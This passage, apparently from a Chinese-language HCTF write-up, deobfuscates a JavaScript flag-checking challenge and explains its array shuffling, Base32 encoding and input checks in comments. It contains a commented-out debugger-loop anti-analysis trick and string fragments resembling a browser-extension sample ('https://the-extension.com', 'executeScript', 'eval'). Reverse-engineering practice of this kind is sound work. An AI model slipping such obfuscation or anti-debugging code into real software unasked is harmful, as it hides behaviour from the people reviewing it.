_0x55b09f = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x508ace = <span class="number">0x0</span>; _0x508ace &lt; _0x4a4483; _0x508ace++) &#123;</span><br><span class="line">                _0x55b09f += _0x5a25ab;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x55b09f;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!m || <span class="title function_">_0x5a6d56</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x5</span>, <span class="number">0x1</span>), <span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x5</span>, <span class="number">0x4</span>) || _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>, <span class="number">0x1</span>) - _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) != <span class="number">0x1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        o = <span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>))[<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x1</span>)[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]() * _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] * <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">return</span> o &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) == <span class="number">0x2</span> &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>) == <span class="title function_">_0x5a6d56</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x7</span>, <span class="number">0x1</span>), <span class="number">0x2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x4cbb89) &#123;</span><br><span class="line">        <span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5bf136 = <span class="variable language_">document</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x32&#x27;</span>)](<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x33&#x27;</span>))[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (_0x5bf136 == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x34&#x27;</span>)](<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x35&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> _0x4d0e29 = <span class="title function_">check</span>(_0x5bf136);</span><br><span class="line">    <span class="keyword">if</span> (_0x4d0e29) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x36&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x37&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;onload&#x27;</span>] = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x38&#x27;</span>), <span class="number">0x32</span>);</span><br><span class="line">    <span class="title function_">test</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>进一步反混淆</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a = [<span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;charCodeAt&#x27;</span>, <span class="string">&#x27;fromCharCode&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>, <span class="string">&#x27;substr&#x27;</span>, <span class="string">&#x27;\x5cw+&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>, <span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;getElementById&#x27;</span>, <span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>, <span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>, <span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>, <span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>, <span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;substring&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, <span class="string">&#x27;Function&#x27;</span>, <span class="string">&#x27;charAt&#x27;</span>, <span class="string">&#x27;idle&#x27;</span>, <span class="string">&#x27;pyW5F1U43VI&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;https://the-extension.com&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;storage&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;then&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;getTime&#x27;</span>, <span class="string">&#x27;setUTCHours&#x27;</span>, <span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;loading&#x27;</span>, <span class="string">&#x27;status&#x27;</span>, <span class="string">&#x27;removeListener&#x27;</span>, <span class="string">&#x27;onUpdated&#x27;</span>, <span class="string">&#x27;callee&#x27;</span>, <span class="string">&#x27;addListener&#x27;</span>, <span class="string">&#x27;onMessage&#x27;</span>, <span class="string">&#x27;runtime&#x27;</span>, <span class="string">&#x27;executeScript&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;Url\x20error&#x27;</span>, <span class="string">&#x27;query&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;active&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 洗牌</span></span><br><span class="line">(<span class="keyword">function</span> (<span class="params">_0xd4b7d6, _0xad25ab</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e3956 = <span class="keyword">function</span> (<span class="params">_0x1661d3</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">_0x5e3956</span>(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, <span class="number">0x1a2</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取数组内容</span></span><br><span class="line"><span class="keyword">var</span> _0xa180 = <span class="keyword">function</span> (<span class="params">_0x5c351c, _0x2046d8</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x180a[_0x5c351c - <span class="number">0x0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主要的 check 函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">input</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x2e2f8d = [<span class="string">&#x27;code&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x0&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2&#x27;</span>), <span class="string">&#x27;invalidMonetizationCode&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x3&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x5&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x6&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x7&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x8&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x9&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xa&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xb&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xc&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xd&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xe&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xf&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x10&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x11&#x27;</span>), <span class="string">&#x27;url&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x12&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x13&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x14&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x15&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x16&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x17&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x18&#x27;</span>), <span class="string">&#x27;tabs&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x19&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1a&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1b&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1c&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1d&#x27;</span>), <span class="string">&#x27;replace&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1e&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1f&#x27;</span>), <span class="string">&#x27;includes&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x20&#x27;</span>), <span class="string">&#x27;length&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x21&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x22&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x23&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x24&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x26&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x27&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x28&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x29&#x27;</span>), <span class="string">&#x27;toString&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2a&#x27;</span>), <span class="string">&#x27;split&#x27;</span>];</span><br><span class="line">        <span class="keyword">var</span> _0x50559f = input[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>, <span class="number">0x4</span>);  <span class="comment">// 获取输入的前四位，hctf&#123;</span></span><br><span class="line">        <span class="keyword">var</span> _0x5cea12 = <span class="built_in">parseInt</span>(<span class="title function_">btoa</span>(_0x50559f), <span class="number">0x20</span>);  <span class="comment">// Base64 编码，转成 int</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(_0x5cea12);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 启动 Debugger，干扰 console，但是对输入没有任何影响</span></span><br><span class="line"><span class="comment">        eval(function (_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2) &#123;</span></span><br><span class="line"><span class="comment">            _0x2d59cf = function (_0x4be75f) &#123;</span></span><br><span class="line"><span class="comment">                return _0x4be75f[&#x27;toString&#x27;](_0x177f13);</span></span><br><span class="line"><span class="comment">            &#125;;</span></span><br><span class="line"><span class="comment">            if (!&#x27;&#x27; [&#x27;replace&#x27;](/^/, String)) &#123;</span></span><br><span class="line"><span class="comment">                while (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);</span></span><br><span class="line"><span class="comment">                _0x802d91 = [</span></span><br><span class="line"><span class="comment">                    function (_0x5e8f1a) &#123;</span></span><br><span class="line"><span class="comment">                        return _0x2829f2[_0x5e8f1a];</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                ];</span></span><br><span class="line"><span class="comment">                _0x2d59cf = function () &#123;</span></span><br><span class="line"><span class="comment">                    return _0xa180(&#x27;0x2b&#x27;);</span></span><br><span class="line"><span class="comment">                &#125;;</span></span><br><span class="line"><span class="comment">                _0x46da6f = 0x1;</span></span><br><span class="line"><span class="comment">            &#125;;</span></span><br><span class="line"><span class="comment">            while (_0x46da6f--)</span></span><br><span class="line"><span class="comment">                if (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180(&#x27;0x2c&#x27;)](new RegExp(&#x27;\x5cb&#x27; + _0x2d59cf(_0x46da6f) + &#x27;\x5cb&#x27;, &#x27;g&#x27;), _0x802d91[_0x46da6f]);</span></span><br><span class="line"><span class="comment">            return _0x200db2;</span></span><br><span class="line"><span class="comment">        &#125;(_0xa180(&#x27;0x2d&#x27;), 0x11, 0x11, _0xa180(&#x27;0x2e&#x27;)[&#x27;split&#x27;](&#x27;|&#x27;), 0x0, &#123;&#125;));</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新洗牌，保证输入的前四位是 hctf&#123;</span></span><br><span class="line">        (<span class="keyword">function</span> (<span class="params">_0x3291b7, _0xced890</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0xaed809 = <span class="keyword">function</span> (<span class="params">_0x3aba26</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (--_0x3aba26) &#123;</span><br><span class="line">                    _0x3291b7[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="title function_">_0xaed809</span>(++_0xced890);</span><br><span class="line">        &#125;(_0x2e2f8d, _0x5cea12 % <span class="number">0x7b</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取数组内容</span></span><br><span class="line">        <span class="keyword">var</span> _0x43c8d1 = <span class="keyword">function</span> (<span class="params">_0x3120e0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> _0x2e2f8d[<span class="built_in">parseInt</span>(_0x3120e0, <span class="number">0x10</span>)];</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字符串转十六进制</span></span><br><span class="line">        <span class="keyword">var</span> stringToHex = <span class="keyword">function</span> (<span class="params">_0x52ba71</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;0x&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; _0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]; i++) &#123;</span><br><span class="line">                char = _0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](i)</span><br><span class="line">                result += char[<span class="title function_">_0x43c8d1</span>(<span class="number">0xc</span>)](<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将输入按照“_”分割</span></span><br><span class="line">        <span class="keyword">var</span> inputs = input[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> a = inputs[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>, <span class="number">0x2</span>);  <span class="comment">// 第一段的最后两个字符</span></span><br><span class="line">        <span class="keyword">var</span> b = inputs[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>);  <span class="comment">// 第一段的第五个字符，也就是“&#123;”</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// (第一段的最后两个字符 ^ &#x27;&#123;&#x27;) % 第一段长度 == 5</span></span><br><span class="line">        <span class="keyword">var</span> challenge1 = (</span><br><span class="line">                <span class="title function_">stringToHex</span>(a) ^ <span class="title function_">stringToHex</span>(b)</span><br><span class="line">                <span class="comment">// 第一段的长度</span></span><br><span class="line">            ) % inputs[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] == <span class="number">0x5</span>;  <span class="comment">// 第一段长度大于 5</span></span><br><span class="line">        <span class="comment">// 第一个判断条件，确定第一段的字符为 hctf&#123;</span></span><br><span class="line">        <span class="comment">// if (!challenge1) &#123;</span></span><br><span class="line">            <span class="comment">// return ![];</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base32 编码</span></span><br><span class="line">        b2c = <span class="keyword">function</span> (<span class="params">_0x3f9bc5</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3c3bd8 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> _0x4dc510 = [];</span><br><span class="line">            <span class="keyword">var</span> _0x4a199f = <span class="title class_">Math</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] / <span class="number">0x5</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x4ee491 = _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] % <span class="number">0x5</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 != <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> _0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; <span class="number">0x5</span> - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += <span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &gt;&gt; <span class="number">0x3</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &amp; <span class="number">0x7</span>) &lt;&lt; <span class="number">0x2</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &gt;&gt; <span class="number">0x6</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x3f</span>) &gt;&gt; <span class="number">0x1</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">0x4</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &gt;&gt; <span class="number">0x4</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">0x1</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &gt;&gt; <span class="number">0x7</span>));</span><br><span class="line">                _0x4dc510[<span 